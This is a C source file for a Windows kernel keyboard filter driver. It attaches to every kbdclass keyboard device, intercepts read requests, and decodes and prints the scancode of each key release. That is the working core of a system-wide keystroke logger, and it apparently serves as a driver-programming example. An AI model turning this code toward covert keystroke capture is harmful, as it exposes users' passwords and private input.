#include <ntddk.h>
#include <Ntstrsafe.h>
#include <ntddkbd.h>
#include "driver.h"

typedef struct kbdFiltExt {
	PDEVICE_OBJECT next_object;
	PIRP irp;
} kbdFiltExt;

volatile LONG g_keyNum = 0;
PDEVICE_OBJECT s_filter_objects[10] = { 0 };
WCHAR g_className[] = L"\\Driver\\kbdclass";

NTSTATUS HookKdbClass(PDRIVER_OBJECT driver_object)
{
	UNREFERENCED_PARAMETER(driver_object);
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING driver_name;
	RtlInitUnicodeString(&driver_name, g_className);
	PDRIVER_OBJECT kbd_driver_object;
	status = ObReferenceObjectByName(&driver_name, OBJ_CASE_INSENSITIVE, NULL,
		0, *IoDriverObjectType, KernelMode, 0, &kbd_driver_object);
	if (!NT_SUCCESS(status)) {
		DbgPrint("cannot get kbdclass object");
		return status;
	}
	ObDereferenceObject(kbd_driver_object);
	int device_count = 0;
	for (PDEVICE_OBJECT device_object = kbd_driver_object->DeviceObject;
		device_object != NULL; device_object = device_object->NextDevice) {
		if (NT_SUCCESS(jjAttachDevice(driver_object, device_object, sizeof(kbdFiltExt),
			&s_filter_objects[device_count]))) {
			device_count++;
		}
	}
	if (!device_count)
		return STATUS_UNSUCCESSFUL;
	return STATUS_SUCCESS;
}

NTSTATUS KbdReadCompleted(PDEVICE_OBJECT device_object, PIRP irp, PVOID context)
{
	UNREFERENCED_PARAMETER(device_object);
	UNREFERENCED_PARAMETER(context);
	DecodeScancode(irp->AssociatedIrp.SystemBuffer,
		(ULONG)irp->IoStatus.Information);
	if (irp->PendingReturned)
		IoMarkIrpPending(irp);
	InterlockedDecrement(&g_keyNum);
	return irp->IoStatus.Status;
}

NTSTATUS classDriverDispatch(PDEVICE_OBJECT dev_obj, PIRP irp)
{
	PIO_STACK_LOCATION isl = IoGetCurrentIrpStackLocation(irp);
	for (int i = 0; i < 10; ++i) {
		while (dev_obj == s_filter_objects[i]) {
			struct kbdFiltExt* ext = (struct kbdFiltExt*)
				s_filter_objects[i]->DeviceExtension;
			if (isl->MajorFunction == IRP_MJ_POWER) {
				PoStartNextPowerIrp(irp);
				IoSkipCurrentIrpStackLocation(irp);
				return PoCallDriver(ext->next_object, irp);
			}
			else if (isl->MajorFunction == IRP_MJ_READ) {
				ext->irp = irp;
				IoCopyCurrentIrpStackLocationToNext(irp);
				IoSetCompletionRoutine(irp, &KbdReadCompleted, NULL, TRUE, FALSE, FALSE);
				g_keyNum++;
				return IoCallDriver(ext->next_object, irp);
			}
			else {
				IoSkipCurrentIrpStackLocation(irp);
				return IoCallDriver(ext->next_object, irp);
			}
		}
	}
	irp->IoStatus.Information = 0;
	irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

VOID classDriverUnload(PDRIVER_OBJECT obj)
{
	UNREFERENCED_PARAMETER(obj);
	for (int i = 0; i < 10; ++i) {
		if (s_filter_objects[i]) {
			struct kbdFiltExt* ext = (struct kbdFiltExt*)
				s_filter_objects[i]->DeviceExtension;
			IoDetachDevice(ext->next_object);
			IoDeleteDevice(s_filter_objects[i]);
		}
	}
	LARGE_INTEGER delay = RtlConvertLongToLargeInteger(100 * DELAY_ONE_MILLISECOND);
	while (g_keyNum) {
		KeDelayExecutionThread(KernelMode, TRUE, &delay);
	}
}

void DecodeScancode(PVOID buffer, ULONG size)
{
	for (ULONG i = 0; i < size / sizeof(KEYBOARD_INPUT_DATA); ++i) {
		PKEYBOARD_INPUT_DATA pkid = (PKEYBOARD_INPUT_DATA)((UCHAR*)buffer + i * sizeof(
			KEYBOARD_INPUT_DATA));
		if (pkid->Flags & KEY_BREAK) {
			print_keystroke((UCHAR)pkid->MakeCode);
		}
	}
}


NTSTATUS jjAttachDevice(PDRIVER_OBJECT driver_object,
	PDEVICE_OBJECT target_object, ULONG extension_size,
	PDEVICE_OBJECT* ppfilter_object)
{
	if (!target_object || !ppfilter_object) {
		return STATUS_INVALID_PARAMETER;
	}

	NTSTATUS status = STATUS_SUCCESS;

	PDEVICE_OBJECT filter_object;
	status = IoCreateDevice(driver_object, extension_size, NULL,
		target_object->DeviceType, 0, FALSE, &filter_object);
	if (!NT_SUCCESS(status)) {
		return status;
	}

	if (target_object->Flags & DO_BUFFERED_IO) {
		filter_object->Flags |= DO_BUFFERED_IO;
	}
	if (target_object->Flags & DO_DIRECT_IO) {
		filter_object->Flags |= DO_DIRECT_IO;
	}
	if (target_object->Characteristics & FILE_DEVICE_SECURE_OPEN) {
		filter_object->Characteristics |= FILE_DEVICE_SECURE_OPEN;
	}
	filter_object->Flags |= DO_POWER_PAGABLE;

	struct kbdFiltExt* ext = (struct kbdFiltExt*)filter_object->DeviceExtension;
	ext->next_object = IoAttachDeviceToDeviceStack(filter_object, target_object);
	if (!ext->next_object) {
		*ppfilter_object = NULL;
		IoDeleteDevice(filter_object);
		status = STATUS_UNSUCCESSFUL;
		return status;
	}
	else {
		*ppfilter_object = filter_object;
	}
	filter_object->Flags = filter_object->Flags & ~DO_DEVICE_INITIALIZING;
	return STATUS_SUCCESS;
}

